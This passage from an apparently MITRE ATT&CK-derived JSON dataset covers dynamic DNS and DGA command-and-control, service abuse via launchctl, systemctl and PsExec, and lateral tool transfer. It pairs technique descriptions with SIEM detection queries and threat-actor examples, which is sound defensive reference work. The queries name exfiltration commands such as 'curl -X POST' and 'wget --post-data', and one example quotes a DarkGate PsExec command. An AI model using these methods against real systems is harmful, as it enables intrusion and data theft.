      "Review logs for SaaS services, including Office 365 and Google Workspace, to detect the configuration of new webhooks.Analytic 1 - Detecting Webhook Creation in SaaS Platforms(EventCode=\"WebhookCreated\" OR EventCode=\"WebhookSubscriptionCreated\" OR EventCode=\"IntegrationAdded\")| where (action IN (\"create_webhook\", \"add_webhook\", \"modify_webhook\"))| stats count by _time, host, user, action, service_name, webhook_url| where count >= 3| eval risk_score=case(    action IN (\"create_webhook\", \"modify_webhook\"), 9,    action IN (\"add_webhook\"), 8)| where risk_score >= 8| table _time, host, user, action, service_name, webhook_url, risk_score",
      "Monitor executed commands and arguments that may exfiltrate data to a webhook as a malicious command and control channel. Additionally, monitor commands that may create new webhook configurations in SaaS services - for example,gh webhook forwardin Github ormgc subscriptions createin Office 365.[8][9]Analytic 1 - Detecting Webhook Data Exfiltration via CLI Tools(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"curl -X POST\", \"Invoke-WebRequest\", \"wget --post-data\", \"python -c 'import requests'\"))| eval risk_score=case(    command IN (\"curl -X POST\", \"Invoke-WebRequest\"), 9,    command IN (\"wget --post-data\", \"python -c 'import requests'\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for files being accessed to exfiltrate data to a webhook as a malicious command and control channel.Analytic 1 - Detecting File Staging Before Webhook Upload(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/tmp/\", \"/var/tmp/\", \"/home//Downloads/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path LIKE \"/tmp/%\", 9,    file_path LIKE \"C:\\Users\\\\Documents\\exfil\", 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g., monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Data loss prevention can be detect and block sensitive data being uploaded to web services via web browsers."
    ]
  },
  "T1568": {
    "Name": "Dynamic Resolution",
    "Description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose ofFallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.[1][2][3]",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT29has used Dynamic DNS providers for their malware C2 infrastructure.[4]",
      "AsyncRATcan be configured to use dynamic DNS.[5]",
      "Bisonalhas used a dynamic DNS service for C2.[6]",
      "BITTERhas used DDNS for C2 communications.[7]",
      "DuringC0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used byANDROMEDA.[8]",
      "Gamaredon Grouphas incorporated dynamic DNS domains in its infrastructure.[9]",
      "Gelsemiumcan use dynamic DNS domain names in C2.[10]",
      "DuringIndian Critical Infrastructure Intrusions,RedEchoused dynamic DNS domains associated with malicious infrastructure.[11]",
      "Mazehas forged POST strings with a random choice from a list of possibilities including \"forum\", \"php\", \"view\", etc. while making connection with the C2, hindering detection efforts.[12]",
      "NETEAGLEcan use HTTP to download resources that contain an IP address and port number pair to connect to for C2.[13]",
      "DuringNight Dragon, threat actors used dynamic DNS services for C2.[14]",
      "ForOperation Dust Storm, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322.[15]",
      "ForOperation Spalax, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.[16]",
      "RedEchoused dynamic DNS domains associated with malicious infrastructure.[11]",
      "RTMhas resolvedPonyC2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain.[17][18]",
      "During theSolarWinds Compromise,APT29used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.[19]",
      "SUNBURSTdynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.[20]",
      "TA2541has used dynamic DNS services for C2 infrastructure.[21]",
      "Tomirishas connected to a signalization server that provides a URL and port, and thenTomirissends a GET request to that URL to establish C2.[22]",
      "Transparent Tribehas used dynamic DNS services to set up C2.[23]"
    ]
  },
  "T1568.001": {
    "Name": "Dynamic Resolution:Fast Flux DNS",
    "Description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.[1][2][3]The simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.[3]In contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
    "Detects": [
      "Monitor for newly constructed network connections that may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution.",
      "In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection."
    ],
    "Procedure Examples": [
      "Amadeyhas used fast flux DNS for its C2.[4]",
      "Gamaredon Grouphas used fast flux DNS to mask their command and control channel behind rotating IP addresses.[5]",
      "gh0st RAToperators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.[6]",
      "menuPasshas used dynamic DNS service providers to host malicious domains.[7]",
      "njRAThas used a fast flux DNS for C2 IP resolution.[8]",
      "TA505has used fast flux to mask botnets by distributing payloads across multiple IPs.[9]"
    ]
  },
  "T1568.002": {
    "Name": "Dynamic Resolution:Domain Generation Algorithms",
    "Description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.[1][2][3]DGAs can take the form of apparently random or \"gibberish\" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.[1][2][4][5]Adversaries may use DGAs for the purpose ofFallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.[4][6][7]",
    "Detects": [
      "Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.[33]CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.[34]Another approach is to use deep learning to classify domains as DGA-generated[35]]"
    ],
    "Procedure Examples": [
      "APT41has used DGAs to change their C2 servers monthly.[8]",
      "Aria-bodyhas the ability to use a DGA for C2 communications.[9]",
      "Astarothhas used a DGA in C2 communications.[10]",
      "Bazarcan implement DGA using the current date as a seed variable.[11]",
      "BONDUPDATERuses a DGA to communicate with command and control servers.[12]",
      "CCBkdrcan use a DGA forFallback Channelsif communications with the primary command and control server are lost.[4]",
      "CHOPSTICKcan use a DGA forFallback Channels, domains are generated by concatenating words from lists.[7]",
      "Confickerhas used a DGA that seeds with the current UTC victim system date to generate domains.[13][14]",
      "DarkWatchmanhas used a DGA to generate a domain name for C2.[15]",
      "Dokihas used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains.[16]",
      "Eburyhas used a DGA to generate a domain name for C2.[17][18]",
      "Grandoreirocan use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily.[19][20]",
      "Milancan use hardcoded domains as an input for domain generation algorithms.[21]",
      "MiniDukecan use DGA to generate new Twitter URLs for C2.[22]",
      "ngrokcan provide DGA for C2 servers through the use of random URL strings that change every 12 hours.[23]",
      "POSHSPYuses a DGA to derive command and control URLs from a word list.[6]",
      "QakBotcan use domain generation algorithms in C2 communication.[24]",
      "ShadowPaduses a DGA that is based on the day of the month for C2 servers.[25][26][8]",
      "Sharkcan send DNS C2 communications using a unique domain generation algorithm.[27][21]",
      "SombRATcan use a custom DGA to generate a subdomain for C2.[28]",
      "TA551has used a DGA to generate URLs from executed macros.[29][30]",
      "Ursnifhas used a DGA to generate domain names for C2.[31]"
    ]
  },
  "T1568.003": {
    "Name": "Dynamic Resolution:DNS Calculation",
    "Description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.[1]One implementation ofDNS Calculationis to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.[1][2][3]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "APT12has used multiple variants ofDNS Calculationincluding multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.[1]"
    ]
  },
  "T1569": {
    "Name": "System Services",
    "Description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.",
    "Detects": [
      "Monitor command-line invocations for tools capable of creating or modifying system services (e.g.,systemctlon Linux,sc.exeon Windows,launchctlon macOS).Analytic 1 - Unusual service modification tools.sourcetype=command_logs| search command IN (\"systemctl\", \"sc\", \"launchctl\")",
      "Track changes to critical service-related files (e.g.,/etc/systemd/system/,/etc/init.d/, and service binaries on Linux,C:\\Windows\\System32\\services.exeon Windows, or/Library/LaunchDaemonson macOS).Analytic 1 - Unusual file modifications related to system services.sourcetype=file_monitor| search file_path IN (\"/etc/systemd/system/\", \"/etc/init.d/\", \"/Library/LaunchDaemons/*\", \"C:\\Windows\\System32\\services.exe\")",
      "Monitor newly executed processes that may abuse system services or daemons to execute commands or programs.Analytic 1 - New processes abusing system services.sourcetype=process_logs| search process IN (\"services.exe\", \"systemd\", \"launchd\")",
      "Track the creation of new services, which could indicate adversarial activity aimed at persistence or execution.Analytic 1 - Monitors service creation and modification activitiessourcetype=service_logs| search service_action=\"create\" OR service_action=\"modify\"| where user NOT IN (\"known_admins\") AND service_name NOT IN (\"known_services\")",
      "Monitor for changes made to windows registry keys and/or values that may abuse system services or daemons to execute commands or programs.Analytic 1 - Malicious service modificationsourcetype= Sysmon EventCode=12| search registry_path=\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\*\" | where registry_action=\"modified\" AND user NOT IN (\"known_admins\")"
    ],
    "Procedure Examples": [
      "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created byPsExecfrom running.[1]",
      "Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level.",
      "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.",
      "Prevent users from installing their own launch agents or launch daemons."
    ]
  },
  "T1569.001": {
    "Name": "System Services:Launchctl",
    "Description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.[1]Adversaries use launchctl to execute commands and programs asLaunch Agents orLaunch Daemons. Common subcommands include:launchctl load,launchctl unload, andlaunchctl start. Adversaries can use scripts or manually run the commandslaunchctl load -w \"%s/Library/LaunchAgents/%s\"or/bin/launchctl loadto executeLaunch Agents orLaunch Daemons.[2][3]",
    "Detects": [
      "Monitor the execution of thelaunchctlcommand, focusing on subcommands such asload,unload, andstartthat may be used by adversaries to load Launch Agents or Launch Daemons.Note: This analytic monitors the execution of the launchctl command and its key subcommands. Exclude known administrative users to minimize false positives.Analytic 1 - Suspicious Launchctlsourcetype=macOS:unified OR sourcetype=osquery OR sourcetype=auditd| search command IN (\"launchctl load\", \"launchctl unload\", \"launchctl start\")",
      "Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Plist files are located in the root, system, and users/Library/LaunchAgentsor/Library/LaunchDaemonsfolders.Launch AgentorLaunch Daemonwith executable paths pointing to /tmp and /Shared folders locations are potentially suspicious.Analytic 1 - Suspicious plist file modifications.sourcetype=osquery OR sourcetype=FSEvents| search file_path IN (\"/Library/LaunchAgents/\", \"/Library/LaunchDaemons/\")| where file_action=\"modified\" AND new_executable_path IN (\"/tmp/\", \"/Shared/\")",
      "Monitor for newly executed daemons that may abuse launchctl to execute commands or programs.Analytic 1 - Executable path is in unusual directoriessourcetype=osquery OR sourcetype=auditd| search parent_process=\"launchctl\" AND process_path IN (\"/tmp/\", \"/Shared/\")",
      "Monitor the creation or modification of Launch Agents or Launch Daemons via the launchctl command.Analytic 1 - Create Service In Suspicious File Pathsourcetype=osquery| search service_action=\"create\" OR service_action=\"modify\"| where user NOT IN (\"known_admins\") AND service_name IN (\"LaunchAgents\", \"LaunchDaemons\")"
    ],
    "Procedure Examples": [
      "AppleJeushas loaded a plist file using thelaunchctlcommand.[4]",
      "Calistouses launchctl to enable screen sharing on the victim’s machine.[5]",
      "Cuckoo Stealercan uselaunchctlto load a LaunchAgent for persistence.[6]",
      "LoudMinerlaunched the QEMU services in the/Library/LaunchDaemons/folder usinglaunchctl. It also useslaunchctlto unload allLaunch Daemons when updating to a newer version ofLoudMiner.[7]",
      "macOS.OSAMinerhas usedlaunchctlto restart theLaunch Agent.[8]",
      "XCSSETloads a system level launchdaemon using thelaunchctl load -wcommand from/System/Librarby/LaunchDaemons/ssh.plist.[9]"
    ]
  },
  "T1569.002": {
    "Name": "System Services:Service Execution",
    "Description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services.[1]The service control manager is accessible to users via GUI components as well as system utilities such assc.exeandNet.PsExeccan also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.[2]Tools such asPsExecandsc.execan accept remote servers as arguments and may be used to conduct remote execution.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction withWindows Serviceduring service persistence or privilege escalation.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse the Windows service control manager to execute malicious commands or payloads.Analytic 1- Commands abusing Windows service control manager.sourcetype=WinEventLog:Security OR sourcetype=Powershell OR sourcetype=Sysmon EventCode IN (1,4688,4104) | search command_line IN (\"sc.exe\", \"net start\", \"net stop\", \"psexec.exe\")| where user!=\"SYSTEM\"  // Exclude common system-level activities",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor for newly executed processes that may abuse the Windows service control manager to execute malicious commands or payloads.Events 4688 (Microsoft Windows Security Auditing) and 1 (Microsoft Windows Sysmon) provide context of Windows processes creation that can be used to implement this detection.This detection is based on uncommon process and parent process relationships. Service Control Manager spawning command shell is a good starting point. Add more suspicious relationships based on the reality of your network environment.In order to reduce false positives, you can also filter the CommandLine event field using parameters such as /c which carries out the command specified by the parent process.Analytic 1 - Service Execution(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") | WHERE Image LIKE \"services.exe\" AND Image LIKE \"cmd.exe\"",
      "Monitor newly constructed services that abuse control manager to execute malicious commands or payloads.Analytic 1 - Suspicious Service Creationsourcetype=WinEventLog:Security OR sourcetype=WinEventLog:System EventCode=4697 OR EventCode=7045| table _time, user, service_name, service_file_name, process_id| where service_file_name != \"legitimate_software_path\"  // Exclude legitimate services",
      "Monitor for changes made to windows registry keys and/or values that may abuse the Windows service control manager to execute malicious commands or payloads.Analytic 1 - Registry changes related to service execution.sourcetype=WinEventLog:Security OR sourcetype=Sysmon EventCode=13 OR EventCode=4657| search registry_path IN (\"HKLM\\SYSTEM\\CurrentControlSet\\Services\")| where registry_value != \"legitimate_software_registry*\"  // Filter out common services"
    ],
    "Procedure Examples": [
      "Anchorcan create and execute services to load its payload.[3][4]",
      "APT32's backdoor has used Windows services as a way to execute its malicious payload.[5]",
      "APT38has created new services or modified existing ones to run executables, commands, or scripts.[6]",
      "APT39has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.[7][8]",
      "APT41used  svchost.exe andNetto execute a system service installed to launch aCobalt StrikeBEACON loader.[9][10]",
      "APT41 DUSTused Windows services to executeDUSTPAN.[11]",
      "Attor's dispatcher can be executed as a service.[12]",
      "Bad Rabbitdrops a file namedinfpub.datinto the Windows directory and is executed through SCManager andrundll.exe.",
      "BBSRATcan start, stop, or delete services.[13]",
      "BlackBytecreated malicious services for ransomware execution.[14][15]",
      "BlackByte 2.0 Ransomwareexecutes as a service when deployed.[16]",
      "Blue Mockingbirdhas executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service.[17]",
      "Brute Ratel C4can create Windows system services for execution.[18]",
      "Chimerahas usedPsExecto deploy beacons on compromised systems.[19]",
      "Clamblingcan create and start services on a compromised host.[20]",
      "Cobalt Strikecan usePsExecto execute a payload on a remote host. It can also use Service Control Manager to start new services.[21][22][23]",
      "DarkGatetries to elevate privileges toSYSTEMusing PsExec to locally execute as a service, such ascmd /c c:\\temp\\PsExec.exe -accepteula -j -d -s [Target Binary].[24]",
      "DEADWOODcan be executed as a service using various names, such asScDeviceEnums.[25]",
      "Empirecan usePsExecto execute a payload on a remote host.[26]",
      "FIN6has created Windows services to execute encoded PowerShell commands.[27]",
      "gh0st RATcan execute its service if the Service key exists. If the key does not exist,gh0st RATwill create and run the service.[28]",
      "HermeticWipercan create system services to aid in executing the payload.[29][30][31]",
      "HermeticWizardcan useOpenRemoteServiceManagerto create a service.[32]",
      "HOPLIGHThas used svchost.exe to execute a malicious DLL .[33]",
      "Hydraquses svchost.exe to execute a malicious DLL included in a new service group.[34]",
      "HyperBrohas the ability to start and stop a specified service.[35]",
      "Impacketcontains various modules emulating other service execution tools such asPsExec.[36]",
      "INC Ransomhas run a file encryption executable viaService Control Manager/7045;winupd,%SystemRoot%\\winupd.exe,user mode service,demand start,LocalSystem.[37]",
      "InvisiMolehas used Windows services as a way to execute its malicious payload.[38]",
      "IPsec Helperis run as a Windows service in victim environments.[25]",
      "Ke3changhas used a tool known as RemoteExec (similar toPsExec) to remotely execute batch scripts and binaries.[39]",
      "Koadiccan run a command on another machine usingPsExec.[40]",
      "LockBit 3.0can usePsExecto execute commands and payloads.[41]",
      "LoudMinerstarted the cryptomining virtual machine as a service on the infected machine.[42]",
      "Mafaldacan create a remote service, let it run once, and then delete it.[43]",
      "Moonstone Sleetused intermediate loader malware such as YouieLoader and SplitLoader that create malicious services.[44]",
      "Thenet startandnet stopcommands can be used inNetto execute or stop Windows services.[45]",
      "Net CrawlerusesPsExecto perform remote service manipulation to execute a copy of itself as part of lateral movement.[46]",
      "Operators deployingNetwalkerhave used psexec and certutil to retrieve theNetwalkerpayload.[47]",
      "NotPetyacan usePsExecto help propagate itself across a network.[48][49]",
      "Okrum's loader can create a new service named NtmsSvc to execute the payload.[50]",
      "Olympic DestroyerutilizesPsExecto help propagate itself across a network.[51]",
      "DuringOperation Honeybee, threat actors ransc startto start the COMSysApp as part of the service hijacking andsc stopto stop and reconfigure the COMSysApp.[52]",
      "DuringOperation Wocao, threat actors created services on remote systems for execution purposes.[53]",
      "Pandorahas the ability to install itself as a Windows service.[54]",
      "PoshC2contains an implementation ofPsExecfor remote execution.[55]",
      "Proxysvcregisters itself as a service on the victim’s machine to run as a standalone process.[56]",
      "Microsoft SysinternalsPsExecis a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[2]",
      "PupyusesPsExecto execute a payload or commands on a remote host.[57]",
      "Pysahas usedPsExecto copy and execute the ransomware.[58]",
      "Ragnar Lockerhas used sc.exe to execute a service that it creates.[59]",
      "RemoteCMDcan execute commands remotely by creating a new service on the remote system.[60]",
      "Shamooncreates a new service named \"ntssrv\" to execute the payload.Shamooncan also spread viaPsExec.[61][62]",
      "Silencehas usedWinexeto install a service on the remote system.[63][64]",
      "SLOTHFULMEDIAhas the capability to start services.[65]",
      "StrongPitycan install a service to execute itself as a service.[66][67]",
      "SysUpdatecan manage services and processes.[54]",
      "TinyTurlacan install itself as a service on compromised machines.[68]",
      "Velvet Antexecuted and installedPlugXas a Windows service.[69]",
      "WastedLockercan execute itself as a service.[70]",
      "WhisperGatecan download and execute AdvancedRun.exe viasc.exe.[71][72]",
      "Winexeinstalls a service on the remote system, executes the command, then uninstalls the service.[73]",
      "Wingbirduses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.[74][75]",
      "Winnti for Windowscan run as a service using svchost.exe.[76]",
      "Wizard Spiderhas usedservices.exeto execute scripts and executables during lateral movement within a victim's network.Wizard Spiderhas also used batch scripts that leveragePsExecto execute a previously transferred ransomware payload on a victim's network.[77][78][79]",
      "xCmdcan be used to execute binaries on remote systems by creating and starting a service.[80]",
      "ZxShellcan create a new service for execution.[81]"
    ]
  },
  "T1569.003": {
    "Name": "System Services:Systemctl",
    "Description": "Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.Adversaries may use systemctl to execute commands or programs asSystemd Services. Common subcommands include:systemctl start,systemctl stop,systemctl enable,systemctl disable, andsystemctl status.[1]",
    "Detects": [
      "Monitor the execution of thesystemctlcommand, focusing on subcommands such asstartandenable, that may be used by adversaries to load system services.Analytic 1 - Suspicious command execution of systemctlsourcetype=auditd OR sourcetype=sysmon_linux(command=\"systemctl\" AND (command=\"start\" OR command=\"enable\"))| stats count by host, user, command, parent_process, _time| where user!=\"root\" AND NOT match(command, \"expected_service\")| sort -_time",
      "Every systemd service must have a corresponding unit file on disk which can be monitored. Unit files are located in the/etc/systemd/system,/usr/lib/systemd/system/, and/home/$username/.config/systemd/user/directories.Analytic 1 - suspicious modification of service unit filessourcetype=auditd(path IN (\"/etc/systemd/system/\", \"/usr/lib/systemd/system/\", \"/home//.config/systemd/user/\") AND (syscall=\"open\" OR syscall=\"write\"))| stats count by file_path, user, process_name, _time| where NOT match(file_path, \"expected_admin_changes\")| sort -_time",
      "Monitor for newly executed daemons that may abuse systemctl to execute commands or programs.Analytic 1 - suspicious process execution of systemctlsourcetype=sysmon_linux OR sourcetype=auditd(parent_process=\"systemd\" OR process_name=\"daemon\")| stats count by process_name, parent_process, user, cmdline, _time| where user!=\"root\" AND NOT match(cmdline, \"known_daemon_pattern\")| sort -_time",
      "Monitor the creation or modification of system services via thesystemctlcommand.Analytic 1 - suspicious systemctl service creationsourcetype=auditd(command=\"systemctl\" AND command=\"enable\" OR command=\"create\")| stats count by user, command, process_name, _time| where NOT match(command, \"whitelisted_services\")| sort -_time"
    ],
    "Procedure Examples": [
      "TeamTNThas created system services to execute cryptocurrency mining software.[2]"
    ]
  },
  "T1570": {
    "Name": "Lateral Tool Transfer",
    "Description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e.,Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing overSMB/Windows Admin Sharesto connected network shares or with authenticated connections viaRemote Desktop Protocol.[1]Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, andftp. In some cases, adversaries may be able to leverageWeb Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.[2]",
    "Detects": [
      "Monitor executed commands and arguments for actions for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files",
      "Monitor newly constructed files to/from a lateral tool transfer",
      "Monitor for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.",
      "Monitor for contextual data about named pipes on the system.",
      "Monitor for unexpected network share access, such as files transferred between shares within a network using protocols such as SMB.",
      "Monitor for unusual processes with internal network connections creating files on-system may be suspiciousNote: Analytic Event Type is for Zeek but can also be implemented in other Network Analysis Frameworks by parsing & decoding captured SMB2 network traffic. From a network traffic capture standpoint, it’s important to capture the right traffic for this type of detection to function (e.g., all endpoint to endpoint if possible or workstation to server and workstation to workstation). As such, it is helpful to have a centralized server area where it is possible to monitor communications between servers and endpoints.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware.",
      "Monitor newly constructed processes that assist in lateral tool transfers."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teammoved their tools laterally within the corporate network and between the ICS and corporate network.[3]",
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamusedmoveto transfer files to a network share.[4]",
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamused a Group Policy Object (GPO) to copyCaddyWiper's executablemsserver.exefrom a staging server to a local hard drive before deployment.[5]",
      "Agriusdownloaded some payloads for follow-on execution from legitimate filesharing services such asufile.ioandeasyupload.io.[6]",
      "Aoqin Dragonhas spread malware in target networks by copying modules to folders masquerading as removable devices.[7]",
      "APT32has deployed tools after moving laterally using administrative accounts.[8]",
      "APT41uses remote shares to move and remotely execute payloads during lateral movemement.[9]",
      "BITSAdmincan be used to createBITS Jobsto upload and/or download files from SMB file servers.[10]",
      "BlackBytetransfered tools such asCobalt Strikeand the AnyDesk remote access tool during operations using SMB shares.[11]",
      "BlackByte Ransomwarespreads itself laterally by writing the JavaScript launcher file to mapped shared folders.[12]",
      "BlackCatcan replicate itself across connected servers viapsexec.[13]",
      "DuringC0015, the threat actors used WMI to loadCobalt Strikeonto additional hosts within a compromised network.[14]",
      "DuringC0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.[15][16]",
      "Chimerahas copied tools between compromised hosts using SMB.[17]",
      "cmdcan be used to copy files to/from a remotely connected internal system.[18]",
      "DustySkysearches for network drives and removable media and duplicates itself onto them.[19]",
      "Ember Bearretrieves follow-on payloads direct from adversary-owned infrastructure for deployment on compromised hosts.[20]",
      "Emotethas copied itself to remote systems using theservice.exefilename.[21]",
      "esentutlcan be used to copy files to/from a remote share.[22]",
      "Expandcan be used to download or upload a file over a network share.[23]",
      "FIN10has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.[24]",
      "ftpmay be abused by adversaries to transfer tools or files between systems within a compromised environment.[25][26]",
      "GALLIUMhas usedPsExecto move laterally between hosts in the target network.[27]",
      "HermeticWizardcan copy files to other machines on a compromised network.[28]",
      "DuringHomeLand Justice, threat actors initiated a process named Mellona.exe to spread theROADSWEEPfile encryptor and a persistence script to a list of internal machines.[29]",
      "Impackethas used itswmiexeccommand, leveraging Windows Management Instrumentation, to remotely stage and execute payloads in victim networks.[30]",
      "INC Ransomhas used a rapid succession of copy commands to install a file encryption executable across multiple endpoints within compromised infrastructure.[31][32]",
      "INC Ransomwarecan push its encryption executable to multiple endpoints within compromised infrastructure.[31]",
      "IPsec Helpercan download additional payloads from command and control nodes and execute them.[33]",
      "LockerGogahas been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.[1]",
      "Lucifercan usecertutilfor propagation on Windows hosts within intranets.[34]",
      "Magic Houndhas copied tools within a compromised network using RDP.[35]",
      "Operators deployingNetwalkerhave used psexec to copy theNetwalkerpayload across accessible systems.[36]",
      "Olympic Destroyerattempts to copy itself to remote machines on the network.[37]",
      "DuringOperation Wocao, threat actors used SMB to copy files to and from target systems.[38]",
      "OutSteelcan download theSaint Botmalware for follow-on execution.[39]",
      "PsExeccan be used to download or upload a file over a network share.[40]",
      "Sandworm Teamhas usedmoveto transfer files to a network share and has copied payloads--such asPrestigeransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object.[4][41]Additionally,Sandworm Teamhas transferred an ISO file into the OT network to gain initial access.[5]",
      "Shamoonattempts to copy itself to remote machines on the network.[42]",
      "Storm-1811has used theImpackettoolset to move and remotely execute payloads to other hosts in victim networks.[43]",
